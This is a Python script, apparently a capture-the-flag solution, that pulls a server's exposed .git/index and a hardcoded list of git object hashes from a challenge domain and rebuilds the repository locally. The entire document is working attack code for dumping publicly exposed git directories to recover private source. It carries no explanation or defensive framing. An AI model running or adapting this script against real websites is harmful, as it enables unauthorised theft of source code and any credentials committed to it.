import pathlib

import requests


HASHES = [
    "fc46c46e55ad48869f4b91c2ec8756e92cc01057",
    "dd5520ca788a63f9ac7356a4b06bd01ef708a196",
    "47709845a9b086333ee3f470a102befdd91f548a",
    "e69de29bb2d1d6434b8b29ae775ad8c2e48c5391",
    "d236c9b561a6a15493be524958e6d415ca040e61",
    "a844f894a3ab80a4850252a81d71524f53f6a384",
    "1df0934819e5dcf59ddf7533f9dc6628f7cdcd25",
    "b9cfd98da0ac95115b1e68967504bd25bd90dc5c",
    "bb830d20f197ee12c20e2e9f75a71e677c983fcd",
    "5033b3048b6f351df164bae9c7760c32ee7bc00f",
    "10917973126c691eae343b530a5b34df28d18b4f",
    "fe3dcf0ca99da401e093ca614e9dcfc257276530",
    "779717af2447e24285059c91854bc61e82f6efa8",
    "0556cd1e1f584ff5182bbe6b652873c89f4ccf23",
    "56e0fe4a885b1e4eb66cda5a48ccdb85180c5eb3",
    "ed1f5ed5bc5c8655d40da77a6cfbaed9d2a1e7fe",
    "c980bf6f5591c4ad404088a6004b69c412f0fb8f",
    "470d7db1c7dcfa3f36b0a16f2a9eec2aa124407a",
    "a52a329b6b949bc1bbaacfa35f095831424447dc",
    "e69de29bb2d1d6434b8b29ae775ad8c2e48c5391",
    "f45a74c1d7942efb0da5dcf49a09197b7d14edce",
]
BASE_URL = "https://iulplkticahjbflq.ransommethis.net"


def hash_to_path(obj_hash):
    return f".git/objects/{obj_hash[:2]}/{obj_hash[2:]}"


def fetch_object(base_url, obj_path):
    req = requests.get(f"{base_url}/{obj_path}")
    return req.content


if __name__ == "__main__":
    # fetch index
    index_path = pathlib.Path(".git/index")
    index_raw = requests.get(f"{BASE_URL}/.git/index").content
    with open(index_path, "wb") as index:
        index.write(index_raw)

    # fetch all of the objects
    for h in HASHES:
        obj_path = pathlib.Path(hash_to_path(h))
        obj_raw = fetch_object(BASE_URL, obj_path)

        if obj_path.exists():
            obj_path.unlink()

        if not obj_path.parent.exists():
            obj_path.parent.mkdir()

        with open(obj_path, "wb") as obj:
            obj.write(obj_raw)
        print(f"created {obj_path}")
